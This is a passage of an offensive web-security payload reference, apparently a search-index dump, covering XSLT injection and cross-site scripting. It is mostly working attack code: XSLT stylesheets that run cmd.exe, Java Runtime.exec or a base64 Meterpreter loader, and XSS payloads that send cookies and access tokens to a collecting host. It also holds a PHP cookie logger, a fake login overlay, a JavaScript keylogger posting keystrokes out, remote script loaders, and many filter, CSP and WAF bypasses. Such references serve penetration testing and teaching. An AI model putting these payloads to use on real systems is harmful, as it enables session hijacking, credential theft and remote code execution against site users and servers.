select=\"document('file:///c:/winnt/win.ini')\"/> Fruits: <!-- Loop for each fruit --> <xsl:for-each select=\"fruit\"> <!-- Print name: description --> - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/> </xsl:for-each> </xsl:template> </xsl:stylesheet>","title":"Read files and SSRF using document"},{"location":"XSLT%20Injection/#remote-code-execution-with-embedded-script-blocks","text":"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"urn:my-scripts\"> <msxsl:script language = \"C#\" implements-prefix = \"user\"> <![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\"; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = \"/c dir\"; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]> </msxsl:script> <xsl:template match=\"/fruits\"> --- BEGIN COMMAND OUTPUT --- <xsl:value-of select=\"user:execute()\"/> --- END COMMAND OUTPUT --- </xsl:template> </xsl:stylesheet>","title":"Remote Code Execution with Embedded Script Blocks"},{"location":"XSLT%20Injection/#remote-code-execution-with-php-wrapper","text":"Execute the function readfile . <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body> <xsl:value-of select=\"php:function('readfile','index.php')\" /> </body> </html> Execute the function scandir . <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"> <xsl:template match=\"/\"> <xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/> </xsl:template> </xsl:stylesheet> Execute a remote php file using assert <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\"> <xsl:variable name=\"payload\"> include(\"http://10.10.10.10/test.php\") </xsl:variable> <xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/> </body> </html> Execute a PHP meterpreter using PHP wrapper. <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"> <xsl:template match=\"/\"> <xsl:variable name=\"eval\"> eval(base64_decode('Base64-encoded Meterpreter code')) </xsl:variable> <xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/> </xsl:template> </xsl:stylesheet>","title":"Remote Code Execution with PHP wrapper"},{"location":"XSLT%20Injection/#remote-code-execution-with-java","text":"<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"> <xsl:template match=\"/\"> <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/> <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/> <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/> <xsl:value-of select=\"$processString\"/> </xsl:template> </xsl:stylesheet> <xml version=\"1.0\"?> <xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\"> <xsl:template match=\"/\"> <xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/> </xsl:template>. </xsl:stylesheet>","title":"Remote Code Execution with Java"},{"location":"XSLT%20Injection/#remote-code-execution-with-native-net","text":"<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\"> <msxsl:script implements-prefix=\"App\" language=\"C#\"> <![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(\"cmd.exe\"); return \"01/01/2001\"; } ]]> </msxsl:script> <xsl:template match=\"ArrayOfTest\"> <TABLE> <xsl:for-each select=\"Test\"> <TR> <TD> <xsl:value-of select=\"App:ToShortDateString(TestDate)\" /> </TD> </TR> </xsl:for-each> </TABLE> </xsl:template> </xsl:stylesheet>","title":"Remote Code Execution with Native .NET"},{"location":"XSLT%20Injection/#references","text":"From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon","title":"References"},{"location":"XSS%20Injection/","text":"Cross Site Scripting Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. Summary Cross Site Scripting Summary Exploit code or POC Data grabber for XSS CORS UI redressing Javascript keylogger Other ways Identify an XSS endpoint Tools XSS in HTML/Applications Common Payloads XSS using HTML5 tags XSS using a remote JS XSS in hidden input XSS when payload is reflected capitalized DOM based XSS XSS in JS Context XSS in wrappers javascript and data URI XSS in files XSS in XML XSS in SVG XSS in SVG (short) XSS in Markdown XSS in SWF flash application XSS in SWF flash application XSS in CSS XSS in PostMessage Blind XSS XSS Hunter Other Blind XSS tools Blind XSS endpoint Tips Mutated XSS Polyglot XSS Filter Bypass and exotic payloads Bypass case sensitive Bypass tag blacklist Bypass word blacklist with code evaluation Bypass with incomplete html tag Bypass quotes for string Bypass quotes in script tag Bypass quotes in mousedown event Bypass dot filter Bypass parenthesis for string Bypass parenthesis and semi colon Bypass onxxxx= blacklist Bypass space filter Bypass email filter Bypass document blacklist Bypass using javascript inside a string Bypass using an alternate way to redirect Bypass using an alternate way to execute an alert Bypass \">\" using nothing Bypass \"<\" and \">\" using \uff1c and \uff1e Bypass \";\" using another character Bypass using HTML encoding Bypass using Katana Bypass using Cuneiform Bypass using Lontara Bypass using ECMAScript6 Bypass using Octal encoding Bypass using Unicode Bypass using UTF-7 Bypass using UTF-8 Bypass using UTF-16be Bypass using UTF-32 Bypass using BOM Bypass using weird encoding or native interpretation Bypass using jsfuck CSP Bypass Bypass CSP using JSONP from Google (Trick by @apfeifer27) Bypass CSP by lab.wallarm.com Bypass CSP by Rhynorater Bypass CSP by @akita_zen Bypass CSP by @404death Common WAF Bypass Cloudflare XSS Bypasses by @Bohdan Korzhynskyi 25st January 2021 21st April 2020 22nd August 2019 5th June 2019 3rd June 2019 Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10) Cloudflare XSS Bypass - 27th February 2018 Chrome Auditor - 9th August 2018 Incapsula WAF Bypass by @Alra3ees- 8th March 2018 Incapsula WAF Bypass by @c0d3G33k - 11th September 2018 Incapsula WAF Bypass by @daveysec - 11th May 2019 Akamai WAF Bypass by @zseano - 18th June 2018 Akamai WAF Bypass by @s0md3v - 28th October 2018 WordFence WAF Bypass by @brutelogic - 12th September 2018 Fortiweb WAF Bypass by @rezaduty - 9th July 2019 References Exploit code or POC Data grabber for XSS Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page. <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script> <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script> <script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script> <script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script> Write the collected data into a file. <?php $cookie = $_GET['c']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\"); fclose($fp); ?> CORS <script> fetch('https://<SESSION>.burpcollaborator.net', { method: 'POST', mode: 'no-cors', body: document.cookie }); </script> UI redressing Leverage the XSS to modify the HTML content of the page in order to display a fake login form. <script> history.replaceState(null, null, '../../../login'); document.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\" </script> Javascript keylogger Another way to collect sensitive data is to set a javascript keylogger. <img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'> Other ways More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all : Taking screenshots using XSS and the HTML5 Canvas JavaScript Port Scanner Network Scanner .NET Shell execution Redirect Form Play Music Identify an XSS endpoint This payload opens the debugger in the developer console rather than triggering a popup alert box. <script>debugger;</script> Modern applications with content hosting can use sandbox domains to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data. For this reason, it's better to use alert(document.domain) or alert(window.origin) rather than alert(1) as default XSS payload in order to know in which scope the XSS is actually executing. Better payload replacing <script>alert(1)</script> : <script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script> While alert() is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so console.log() can be used instead to display a message in the console of the developer console (doesn't require any interaction). Example: <script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script> References: Google Bughunter University - XSS in sandbox domains LiveOverflow Video - DO NOT USE alert(1) for XSS LiveOverflow blog post - DO NOT USE alert(1) for XSS Tools Most tools are also suitable for blind XSS attacks: XSSStrike : Very popular but unfortunately not very well maintained xsser : Utilizes a headless browser to detect XSS vulnerabilities Dalfox : Extensive functionality and extremely fast thanks to the implementation in Go XSpear : Similar to Dalfox but based on Ruby domdig : Headless Chrome XSS Tester XSS in HTML/Applications Common Payloads // Basic payload <script>alert('XSS')</script> <scr<script>ipt>alert('XSS')</scr<script>ipt> \"><script>alert('XSS')</script> \"><script>alert(String.fromCharCode(88,83,83))</script> <script>\\u0061lert('22')</script> <script>eval('\\x61lert(\\'33\\')')</script> <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\" <object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\"> // Img payload <img src=x onerror=alert('XSS');> <img src=x onerror=alert('XSS')// <img src=x onerror=alert(String.fromCharCode(88,83,83));> <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));> <img src=x:alert(alt) onerror=eval(src) alt=xss> \"><img src=x onerror=alert('XSS');> \"><img src=x onerror=alert(String.fromCharCode(88,83,83));> // Svg payload <svg onload=alert(1)> <svg/onload=alert('XSS')> <svg onload=alert(1)// <svg/onload=alert(String.fromCharCode(88,83,83))> <svg id=alert(1) onload=eval(id)> \"><svg/onload=alert(String.fromCharCode(88,83,83))> \"><svg/onload=alert(/XSS/) <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script) <svg><script>alert('33') <svg><script>alert&lpar;'33'&rpar; // Div payload <div onpointerover=\"alert(45)\">MOVE HERE</div> <div onpointerdown=\"alert(45)\">MOVE HERE</div> <div onpointerenter=\"alert(45)\">MOVE HERE</div> <div onpointerleave=\"alert(45)\">MOVE HERE</div> <div onpointermove=\"alert(45)\">MOVE HERE</div> <div onpointerout=\"alert(45)\">MOVE HERE</div> <div onpointerup=\"alert(45)\">MOVE HERE</div> XSS using HTML5 tags <body onload=alert(/XSS/.source)> <input autofocus onfocus=alert(1)> <select autofocus onfocus=alert(1)> <textarea autofocus onfocus=alert(1)> <keygen autofocus onfocus=alert(1)> <video/poster/onerror=alert(1)> <video><source onerror=\"javascript:alert(1)\"> <video src=_ onloadstart=\"alert(1)\"> <details/open/ontoggle=\"alert`1`\"> <audio src onloadstart=alert(1)> <marquee onstart=alert(1)> <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter> <body ontouchstart=alert(1)> // Triggers when a finger touch the screen <body ontouchend=alert(1)> // Triggers when a finger is removed from touch screen <body ontouchmove=alert(1)> // When a finger is dragged across the screen. XSS using a remote JS <svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'> <script src=14.rs> // you can also specify an arbitrary payload with 14.rs/#payload e.g: 14.rs/#alert(document.domain) XSS in hidden input <input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> Use CTRL+SHIFT+X to trigger the onclick event XSS when payload is reflected capitalized <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)> DOM based XSS Based on a DOM XSS sink. #\"><img src=/ onerror=alert(2)> XSS in JS Context -(confirm)(document.domain)// ; alert(1);// // (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic) XSS in wrappers javascript and data URI XSS with javascript: javascript:prompt(1) %26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41 We can encode the \"javascript:\" in Hex/Octal \\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1) \\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1) \\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1) We can use a 'newline character' java%0ascript:alert(1) - LF (\\n) java%09script:alert(1) - Horizontal tab (\\t) java%0dscript:alert(1) - CR (\\r) Using the escape character \\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\) Using the newline and a comment // javascript://%0Aalert(1) javascript://anything%0D%0A%0D%0Awindow.alert(1) XSS with data: data:text/html,<script>alert(0)</script> data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ <script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script> XSS with vbscript: only IE vbscript:msgbox(\"XSS\") XSS in files NOTE: The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup. <name> <value><![CDATA[<script>confirm(document.domain)</script>]]></value> </name> XSS in XML <html> <head></head> <body> <something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script> </body> </html> XSS in SVG <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert(document.domain); </script> </svg> XSS in SVG (short) <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/> <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg> <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg> <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg> XSS in Markdown [a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](javascript:window.onerror=alert;throw%201) XSS in SWF flash application Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain); IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);} IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1); more payloads in ./files XSS in SWF flash application flashmediaelement.swf?jsinitfunctio%gn=alert`1` flashmediaelement.swf?jsinitfunctio%25gn=alert(1) ZeroClipboard.swf?id=\\\"))} catch(e) {alert(1);}//&width=1000&height=1000 swfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!alert(1);// swfupload.swf?buttonText=test<a href=\"javascript:confirm(1)\"><img src=\"https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\"/></a>&.swf plupload.flash.swf?%#target%g=alert&uid%g=XSS& moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true video-js.swf?readyFunction=alert(1) player.swf?playerready=alert(document.cookie) player.swf?tracecall=alert(document.cookie) banner.swf?clickTAG=javascript:alert(1);// io.swf?yid=\\\"));}catch(e){alert(1);}// video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29 bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4 flashcanvas.swf?id=test\\\"));}catch(e){alert(document.domain)}// phpmyadmin/js/canvg/flashcanvas.swf?id=test\\\u201d));}catch(e){alert(document.domain)}// XSS in CSS <!DOCTYPE html> <html> <head> <style> div { background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\"); background-color: #cccccc; } </style> </head> <body> <div>lol</div> </body> </html> XSS in PostMessage If the target origin is asterisk * the message can be sent to any domain has reference to the child page. <html> <body> <input type=button value=\"Click Me\" id=\"btn\"> </body> <script> document.getElementById('btn').onclick = function(e){ window.poc = window.open('http://www.redacted.com/#login'); setTimeout(function(){ window.poc.postMessage( { \"sender\": \"accounts\", \"url\": \"javascript:confirm('XSS')\", }, '*' ); }, 2000); } </script> </html> Blind XSS XSS Hunter Available at https://xsshunter.com/app XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service. \"><script src=//yoursubdomain.xss.ht></script> javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://yoursubdomain.xss.ht\\';document.body.appendChild(a)') <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//yoursubdomain.xss.ht\");a.send();</script> <script>$.getScript(\"//yoursubdomain.xss.ht\")</script> Other Blind XSS tools sleepy-puppy - Netflix bXSS - LewisArdern ezXSS - ssl Blind XSS endpoint Contact forms Ticket support Referer Header Custom Site Analytics Administrative Panel logs User Agent Custom Site Analytics Administrative Panel logs Comment Box Administrative Panel Tips You can use a Data grabber for XSS and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool. Eg. payload <script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script> Eg. one-line HTTP server: $ ruby -run -ehttpd . -p8080 Mutated XSS Use browsers quirks to recreate some HTML tags when it is inside an element.innerHTML . Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/. <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"> Polyglot XSS Polyglot XSS - 0xsobky jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e Polyglot XSS - Ashar Javed \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\"> Polyglot XSS - Mathias Karlsson \" onclick=alert(1)//<button \u2018 onclick=alert(1)//> */ alert(1)// Polyglot XSS - Rsnake ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT> Polyglot XSS - Daniel Miessler ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \u201c onclick=alert(1)//<button \u2018 onclick=alert(1)//> */ alert(1)// '\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"></script><script>alert(1)</script>\"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http://i.imgur.com/P8mL8.jpg\"> javascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/* javascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a javascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/ javascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/* javascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/* javascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()// javascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/* --></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/* /</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/* javascript://--></title></style></textarea></script><svg \"//' onclick=alert()// /</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/* Polyglot XSS - @s0md3v -->'\"/></sCript><svG x=\">\" onload=(co\\u006efirm)``> <svg%0Ao%00nload=%09((pro\\u006dpt))()// Polyglot XSS - from @filedescriptor's Polyglot Challenge # by crlf javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//> # by europa javascript:\"/*'/*`/*\\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//> # by EdOverflow javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//> # by h1/ragnar javascript:`//\"//\\\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>` Filter Bypass and exotic payloads Bypass case sensitive <sCrIpt>alert(1)</ScRipt> Bypass tag blacklist <script x> <script x>alert('XSS')<script y> Bypass word blacklist with code evaluation eval('ale'+'rt(0)'); Function(\"ale\"+\"rt(1)\")(); new Function`al\\ert\\`6\\``; setTimeout('ale'+'rt(2)'); setInterval('ale'+'rt(10)'); Set.constructor('ale'+'rt(13)')(); Set.constructor`al\\x65rt\\x2814\\x29```; Bypass with incomplete html tag Works on IE/Firefox/Chrome/Safari <img src='1' onerror='alert(0)' < Bypass quotes for string String.fromCharCode(88,83,83) Bypass quotes in script tag http://localhost/bla.php?test=</script><script>alert(1)</script> <html> <script> <?php echo 'foo=\"text '.$_GET['test'].'\";';`?> </script> </html> Bypass quotes in mousedown event You can bypass a single quote with ' in an on mousedown event handler <a href=\"\" onmousedown=\"var name = '&#39;;alert(1)//'; alert('smthg')\">Link</a> Bypass dot filter <script>window['alert'](document['domain'])</script> Convert IP address into decimal format: IE. http://192.168.1.1 == http://3232235777 http://www.geektools.com/cgi-bin/ipconv.cgi <script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script> Base64 encoding your XSS payload with Linux command: IE. echo -n \"alert(document.cookie)\" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ== Bypass parenthesis for string alert`1` setTimeout`alert\\u0028document.domain\\u0029`; Bypass parenthesis and semi colon // From @garethheyes <script>onerror=alert;throw 1337</script> <script>{onerror=alert}throw 1337</script> <script>throw onerror=alert,'some string',123,'haha'</script> // From @terjanq <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script> // From @cgvwzq <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script> Bypass onxxxx= blacklist <object onafterscriptexecute=confirm(0)> <object onbeforescriptexecute=confirm(0)> // Bypass onxxx= filter with a null byte/vertical tab <img src='1' onerror\\x00=alert(0) /> <img src='1' onerror\\x0b=alert(0) /> // Bypass onxxx= filter with a '/' <img src='1' onerror/=alert(0) /> Bypass space filter // Bypass space filter with \"/\" <img/src='1'/onerror=alert(0)> // Bypass space filter with 0x0c/^L <svg onload = alert(1) > $ echo \"<svg^Lonload^L=^Lalert(1)^L>\" | xxd 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c <svg.onload.=.al 00000010: 6572 7428 3129 0c3e 0a ert(1).>. Bypass email filter ( RFC compliant ) \"><svg/onload=confirm(1)>\"@x.y Bypass document blacklist <div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script> window[\"doc\"+\"ument\"] Bypass using javascript inside a string <script> foo=\"text </script><script>alert(1)</script>\"; </script> Bypass using an alternate way to redirect location=\"http://google.com\" document.location = \"http://google.com\" document.location.href=\"http://google.com\" window.location.assign(\"http://google.com\") window['location']['href']=\"http://google.com\" Bypass using an alternate way to execute an alert From @brutelogic tweet. window['alert'](0) parent['alert'](1) self['alert'](2) top['alert'](3) this['alert'](4) frames['alert'](5) content['alert'](6) [7].map(alert) [8].find(alert) [9].every(alert) [10].filter(alert) [11].findIndex(alert) [12].forEach(alert); From @theMiddle - Using global variables The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its index number instead the function name . c=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; } // 5 Then calling alert is : Object.keys(self)[5] // \"alert\" self[Object.keys(self)[5]](\"1\") // alert(\"1\") We can find \"alert\" with a regular expression like ^a[rel]+t$ : a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a() // then you can use a() with Object.keys self[Object.keys(self)[a()]](\"1\") // alert(\"1\") Oneliner: a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\") From @quanyang tweet. prompt`${document.domain}` document.location='java\\tscript:alert(1)' document.location='java\\rscript:alert(1)' document.location='java\\tscript:alert(1)' From @404death tweet. eval('ale'+'rt(0)'); Function(\"ale\"+\"rt(1)\")(); new Function`al\\ert\\`6\\``; constructor.constructor(\"aler\"+\"t(3)\")(); [].filter.constructor('ale'+'rt(4)')(); top[\"al\"+\"ert\"](5); top[8680439..toString(30)](7); top[/al/.source+/ert/.source](8); top['al\\x65rt'](9); open('java'+'script:ale'+'rt(11)'); location='javascript:ale'+'rt(12)'; setTimeout`alert\\u0028document.domain\\u0029`; setTimeout('ale'+'rt(2)'); setInterval('ale'+'rt(10)'); Set.constructor('ale'+'rt(13)')(); Set.constructor`al\\x65rt\\x2814\\x29```; Bypass using an alternate way to trigger an alert var i = document.createElement(\"iframe\"); i.onload = function(){ i.contentWindow.alert(1); } document.appendChild(i); // Bypassed security XSSObject.proxy = function (obj, name, report_function_name, exec_original) { var proxy = obj[name]; obj[name] = function () { if (exec_original) { return proxy.apply(this, arguments); } }; XSSObject.lockdown(obj, name); }; XSSObject.proxy(window, 'alert', 'window.alert', false); Bypass \">\" using nothing You don't need to close your tags. <svg onload=alert(1)// Bypass \"<\" and \">\" using \uff1c and \uff1e Unicode Character U+FF1C and U+FF1E \uff1cscript/src=//evil.site/poc.js\uff1e Bypass \";\" using another character 'te' * alert('*') * 'xt'; 'te' / alert('/') / 'xt'; 'te' % alert('%') % 'xt'; 'te' - alert('-') - 'xt'; 'te' + alert('+') + 'xt'; 'te' ^ alert('^') ^ 'xt'; 'te' > alert('>') > 'xt'; 'te' < alert('<') < 'xt'; 'te' == alert('==') == 'xt'; 'te' & alert('&') & 'xt'; 'te' , alert(',') , 'xt'; 'te' | alert('|') | 'xt'; 'te' ? alert('ifelsesh') : 'xt'; 'te' in alert('in') in 'xt'; 'te' instanceof alert('instanceof') instanceof 'xt'; Bypass using HTML encoding %26%2397;lert(1) &#97;&#108;&#101;&#114;&#116; ></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)> Bypass using Katana Using the Katakana library. javascript:([,\u30a6,,,,\u30a2]=[]+{},[\u30cd,\u30db,\u30cc,\u30bb,,\u30df,\u30cf,\u30d8,,,\u30ca]=[!!\u30a6]+!\u30a6+\u30a6.\u30a6)[\u30c4=\u30a2+\u30a6+\u30ca+\u30d8+\u30cd+\u30db+\u30cc+\u30a2+\u30cd+\u30a6+\u30db][\u30c4](\u30df+\u30cf+\u30bb+\u30db+\u30cd+'(-~\u30a6)')() Bypass using Cuneiform \ud808\udc00='',\ud808\ude7a=!\ud808\udc00+\ud808\udc00,\ud808\udc03=!\ud808\ude7a+\ud808\udc00,\ud808\uddfa=\ud808\udc00+{},\ud808\udf10=\ud808\ude7a[\ud808\udc00++], \ud808\udc1f=\ud808\ude7a[\ud808\ude2b=\ud808\udc00],\ud808\udc06=++\ud808\ude2b+\ud808\udc00,\ud808\udc79=\ud808\uddfa[\ud808\ude2b+\ud808\udc06],\ud808\ude7a[\ud808\udc79+=\ud808\uddfa[\ud808\udc00] 